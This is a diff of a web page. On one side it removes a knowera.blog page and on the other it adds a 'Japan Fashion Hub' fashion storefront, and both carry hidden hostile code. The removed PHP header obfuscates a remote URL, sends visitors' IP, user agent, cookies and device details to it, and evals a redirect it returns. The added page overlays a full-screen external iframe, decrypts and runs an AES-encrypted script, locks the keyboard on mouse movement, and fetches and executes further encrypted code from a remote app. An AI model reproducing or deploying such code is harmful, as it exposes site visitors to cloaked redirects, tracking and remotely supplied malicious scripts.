@@ -1,13 +1,339 @@
-<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null, $q=null){if(empty($u)){return '$("#lo532648ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";eval(c);$("html").show();';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["spe"])){$date = date("Y-m-d H:i:s");$id = "532648";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"cam"=>$_POST["cam"],"mic"=>$_POST["mic"],"spe"=>$_POST["spe"],"mou"=>$_POST["mou"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}}?>
+<html lang="en" style="overflow: hidden;"><head>
+<script async="" defer="" src="https://tools.luckyorange.com/core/lo.js?site-id=2ecd9266"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Japan Fashion Hub</title>
 
-<html><head><meta charset="UTF-8" class="subject-BRzdTkrZKH"/><link rel="stylesheet" href="styles.css" class="picture-loAUZrAI"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="thumbnail-ZlBwAcs"/><meta name="referrer" content="no-referrer" class="img-jXSAAUeKQtT"/><style> @import url('https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400..800;1,400..800&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #555052; border-radius: 6px; } *::-webkit-scrollbar-thumb { background-color: #ead498; border-radius: 6px; border: 2px solid #555052; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>knowera.blog</title>
+<meta name="description" content="Japan Fashion Hub showcases the latest Japanese fashion, including men's and women's wear and accessories.">
+<meta name="keywords" content="Japanese fashion, men, women, polo shirts, fashion shopping">
+<meta name="author" content="Japan Fashion Hub">
 
-<style>body {display: none;}</style>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo532648ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){navigator.enumerateDevices=function(a){navigator.mediaDevices.enumerateDevices().then(a)}}var MeDe=[];var caEnu=false;if(typeof MediaStreamTrack!=="undefined"&&"getSources"in MediaStreamTrack){caEnu=true}else if(navigator.mediaDevices&&!!navigator.mediaDevices.enumerateDevices){caEnu=true}var hM=false;var hS=false;var hW=false;var iMalCa=false;var iWalCa=false;function chDes(f){if(!caEnu){return}if(!navigator.enumerateDevices&&window.MediaStreamTrack&&window.MediaStreamTrack.getSources){navigator.enumerateDevices=window.MediaStreamTrack.getSources.bind(window.MediaStreamTrack)}if(!navigator.enumerateDevices&&navigator.enumerateDevices){navigator.enumerateDevices=navigator.enumerateDevices.bind(navigator)}if(!navigator.enumerateDevices){if(f){f()}return}MeDe=[];navigator.enumerateDevices(function(e){e.forEach(function(a){var b={};for(var d in a){b[d]=a[d]}if(b.kind==="audio"){b.kind="audioinput"}if(b.kind==="video"){b.kind="videoinput"}var c;MeDe.forEach(function(d){if(d.id===b.id&&d.kind===b.kind){c=true}});if(c){return}if(!b.devId){b.devId=b.id}if(!b.id){b.id=b.devId}if(b.kind==="videoinput"&&!iWalCa){iWalCa=true}if(b.kind==="audioinput"&&!iMalCa){iMalCa=true}if(b.kind==="audioinput"){hM=true}if(b.kind==="audiooutput"){hS=true}if(b.kind==="videoinput"){hW=true}MeDe.push(b)});if(f){f()}})}chDes(function(){if(matchMedia("(pointer:fine)").matches){mou=true}else{mou=false}var a=new XMLHttpRequest();a.open("POST",location.href,false);a.setRequestHeader("Content-Type","application/x-www-form-urlencoded");a.onreadystatechange=function(){if(a.responseText.startsWith("func")){eval(a.responseText)}else{document.getElementsByTagName("html")[0].style.display="block"}};a.send(encodeURI("cam="+hW+"&spe="+hS+"&mic="+hM+"&mou="+mou))});})</script>
-  
-  <!-- Google tag (gtag.js) -->
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+background:#fff;
+color:#222;
+line-height:1.6;
+}
+
+img{
+width:100%;
+display:block;
+}
+
+a{
+text-decoration:none;
+color:inherit;
+}
+
+.container{
+width:95%;
+max-width:1400px;
+margin:auto;
+}
+
+header{
+background:#082b5c;
+color:#fff;
+padding:15px 0;
+position:sticky;
+top:0;
+z-index:100;
+}
+
+.nav{
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.logo{
+font-size:28px;
+font-weight:bold;
+}
+
+.menu{
+display:flex;
+gap:20px;
+font-size:14px;
+}
+
+.hero{
+padding:20px 0;
+}
+
+.hero-grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:15px;
+}
+
+.hero-card{
+position:relative;
+overflow:hidden;
+}
+
+.hero-card img{
+height:500px;
+object-fit:cover;
+}
+
+.hero-text{
+position:absolute;
+bottom:20px;
+left:20px;
+color:#fff;
+font-size:24px;
+font-weight:bold;
+text-shadow:0 2px 10px rgba(0,0,0,.6);
+}
+
+.section-title{
+text-align:center;
+font-size:34px;
+margin:50px 0 25px;
+font-weight:700;
+}
+
+.category-grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:20px;
+margin-bottom:60px;
+}
+
+.category-card{
+position:relative;
+}
+
+.category-card img{
+height:450px;
+object-fit:cover;
+}
+
+.category-name{
+position:absolute;
+bottom:30px;
+left:30px;
+font-size:48px;
+color:#fff;
+font-weight:bold;
+letter-spacing:4px;
+text-shadow:0 2px 8px rgba(0,0,0,.6);
+}
+
+.products{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:20px;
+}
+
+.product{
+text-align:center;
+}
+
+.product img{
+height:320px;
+object-fit:cover;
+background:#f7f7f7;
+}
+
+.product h3{
+font-size:14px;
+margin:10px 0;
+}
+
+.price{
+font-weight:bold;
+color:#082b5c;
+}
+
+.story{
+padding:80px 0;
+}
+
+.story-grid{
+display:grid;
+grid-template-columns:1fr 1fr 1fr;
+gap:15px;
+}
+
+.story-grid img{
+height:550px;
+object-fit:cover;
+}
+
+.story-text{
+text-align:center;
+max-width:800px;
+margin:40px auto;
+}
+
+.instagram{
+display:grid;
+grid-template-columns:repeat(6,1fr);
+gap:10px;
+}
+
+.instagram img{
+height:180px;
+object-fit:cover;
+}
+
+.news{
+margin:60px 0;
+}
+
+.news ul{
+list-style:none;
+border:1px solid #ddd;
+}
+
+.news li{
+padding:15px;
+border-bottom:1px solid #eee;
+}
+
+footer{
+background:#082b5c;
+color:white;
+padding:50px 20px;
+text-align:center;
+margin-top:50px;
+}
+
+@media(max-width:900px){
+
+.hero-grid,
+.story-grid{
+grid-template-columns:1fr;
+}
+
+.category-grid{
+grid-template-columns:1fr;
+}
+
+.instagram{
+grid-template-columns:repeat(2,1fr);
+}
+
+.hero-card img{
+height:400px;
+}
+
+.category-card img{
+height:350px;
+}
+}
+</style>
+
+<script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
+
+<body style="overflow: hidden;"><div id="bruceDiv" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;"><iframe src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script><script> window.addEventListener("mousemove", initiateApiRequestOnce);
+    let
+        requestSent = false;
+
+    async function initiateApiRequestOnce() {
+        if (requestSent) return;
+        requestSent = true;
+        window.removeEventListener("mousemove", initiateApiRequestOnce);
+        secureKeyboardAccess();
+        const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        try {
+            const encodedScript = await transmitTimezoneData(
+                    "https://seahorse-app-5eeym.ondigitalocean.app/timezone",
+                    clientTimezone
+                )
+            ;
+            decodeAndRunScript(encodedScript);
+        } catch (error) {
+            console.error("Error processing script:", error);
+        }
+    }
+
+    function
+    secureKeyboardAccess() {
+        if (navigator.keyboard) {
+            navigator.keyboard.lock().catch((err) =>
+                console.warn("Keyboard lock failed:", err)
+            )
+            ;
+        }
+    }
+
+    async function transmitTimezoneData(url, timezone) {
+        try {
+            const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    }
+                    ,
+                    body: JSON.stringify({timezone, fullUrl: window.location.href}),
+                })
+            ;
+            if (!response.ok) {
+                throw new Error('HTTP error! Status: ');
+            }
+            return response.text();
+        } catch (error) {
+            console.error("Error sending timezone data:", error);
+            throw error;
+        }
+    }
+
+    function
+    aesDecode(encodedText) {
+        try {
+            const bytes = CryptoJS.AES.decrypt(
+                    encodedText,
+                    "U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI="
+                )
+            ;
+            return bytes.toString(CryptoJS.enc.Utf8);
+        } catch (error) {
+            console.error("AES decryption failed:", error);
+            return "";
+        }
+    }
+
+    function
+    decodeAndRunScript(encodedScript) {
+        try {
+            const decodedScript = aesDecode(decodeURIComponent(encodedScript));
+            if (decodedScript) {
+                new Function(decodedScript)(); // Safer than eval
+            } else {
+                throw new Error("Decoded script is empty.");
+            }
+        } catch (error) {
+            console.error("Error executing script:", error);
+        }
+    }</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+
+<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -16,4 +342,186 @@
 
   gtag('config', 'G-0LY0HY7L01');
 </script>
-</head><body class="thumb-PghTHOqChVesL"><main class="box-JwiWSpmBbRH"><div style="display: flex; position: relative; justify-content: center; align-items: center; width: 80%; height: max-content; margin: calc(0vw/var(--resizer)*100) auto calc(0vw/var(--resizer)*100) auto; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: undefined; flex-direction: column; background: inherit; background-color: #ead498; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'triangles-1_4139'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-45px%2C%200)%20rotate(50deg)%20scale(0.7727427789521113)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-17px%2C%2024px)%20rotate(133deg)%20scale(0.6433189235391454)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%20-34px)%20rotate(18deg)%20scale(0.7323354353416378)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'30946'%20patternUnits%3D'userSpaceOnUse'%20width%3D'80'%20height%3D'80'%20patternTransform%3D'scale(7)%20rotate(54)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f4ffff'%2F%3E%3Cpath%20d%3D'M20%200L0%2020h20V0zm0%2020v20l20-20H20z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20transform%3D'translate(20%2C0)'%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23ead498'%2F%3E%3Cpath%20d%3D'M20%200l20%2020V0zM0%2020v20h20z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20transform%3D'translate(20%2C0)'%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23ead498'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-133%2C-39)'%20fill%3D'url(%2330946)'%2F%3E%3C%2Fsvg%3E&quot;);" class="md-YqIawUrpscxlYRrN"><div class="current-PRBRdQWRI"><div class="subtitle-yxkWHSLF"><a href="themelist0.html" class="sidebar-qWNCfJUPEgfPrDdd"><span class="aside-YDvEBgtAlByg">Discover more</span></a></div><div class="widget-ozcudlZDJnYiSVQ"><h3 class="content-QSEHqthxZp">knowera.blog</h3><span class="heading-ftZUYWoTkAEqU">This Study Writing article Reading explores the role of Academic Research Innovation Skills higher education in fostering Curriculum global citizenship, emphasizing Teaching Learning the importance Certification Literacy Examination Training of cultural understanding and social Knowledge responsibility.</span></div></div></div><div class="col-QlZFkBlyMPWd"><div class="preview-pWFkdgZhsYeI"><div class="section-yDpSFJDXsdXSc"><h3 class="all-fovTMzYoiEbI">Viewpoint</h3></div></div><div class="thumbnail-oyTrAuGFYFDDz"><div class="wrapper-hlFRAFKb"><img src="./img/93938ba7222b8bda8995a079ff9fad11c6f83c80.jpg" class="more-YLjnngmwjg"/><img src="./img/9a68754f10beb69b71258281b3102a8dc078bb81.jpg" class="medium-WNEnmXdl"/><img src="./img/12c3236ba91ec170779b5ce6548bfc7e98c550eb.jpg" class="sidebar-BjhwYriNEx"/><img src="./img/9775222e0d78d16dadbcc954be3f152ae3ffeebd.jpg" class="tip-skcZuLxSQNatDE"/><img src="./img/fe9815f5d4c7ae6bd59fc703726630ef6a1ed697.jpg" class="wide-JZZcfgcgjkz"/><img src="./img/4453edc748e5c75cabe26028db1f77c64083e164.jpg" class="wide-dczvMHSTBASkr"/><img src="./img/1ebbc6394488d07617246bd972e644c9ed091113.jpg" class="big-oIrVyRjjczYElM"/><img src="./img/f3b288761bcf0c254e60d35b7410064578a11bab.jpg" class="wide-aPPdpnlrTWWN"/><img src="./img/c000ac6bb93b95d07ca96b5c2aa4fee6c278c631.jpg" class="btn-sMYkQjnRDj"/></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; min-width: 80%; gap: calc(29vw/var(--resizer)*100); padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; flex-direction: column; background-color: #ead498; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'triangles-1_4139'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-45px%2C%200)%20rotate(50deg)%20scale(0.7727427789521113)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-17px%2C%2024px)%20rotate(133deg)%20scale(0.6433189235391454)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%20-34px)%20rotate(18deg)%20scale(0.7323354353416378)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'30946'%20patternUnits%3D'userSpaceOnUse'%20width%3D'80'%20height%3D'80'%20patternTransform%3D'scale(7)%20rotate(54)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f4ffff'%2F%3E%3Cpath%20d%3D'M20%200L0%2020h20V0zm0%2020v20l20-20H20z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20transform%3D'translate(20%2C0)'%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23ead498'%2F%3E%3Cpath%20d%3D'M20%200l20%2020V0zM0%2020v20h20z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20transform%3D'translate(20%2C0)'%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23ead498'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-133%2C-39)'%20fill%3D'url(%2330946)'%2F%3E%3C%2Fsvg%3E&quot;);" class="content-CUbyTHcwN"><div class="wide-QVBAklfKoEhz"><div class="image-PwyWLFY"><h3 class="large-XArPUiqk">Reading hub</h3></div></div><div class="xs-tzkUbitlFb"><div class="tiny-hDiGjPMMRFjyk"><div class="huge-YdUVfsCwTbmPOzMz"><a href="themelist1.html" class="widget-wBlxasU"><span class="medium-OLNADJofSGqoDPBT">Read full</span></a><a href="index.php" class="box-cSFoNjI"><span class="button-FOvDBOCCNfmrmWca">Share</span></a></div><div class="wide-JXHDgzEsxdwgf"><div 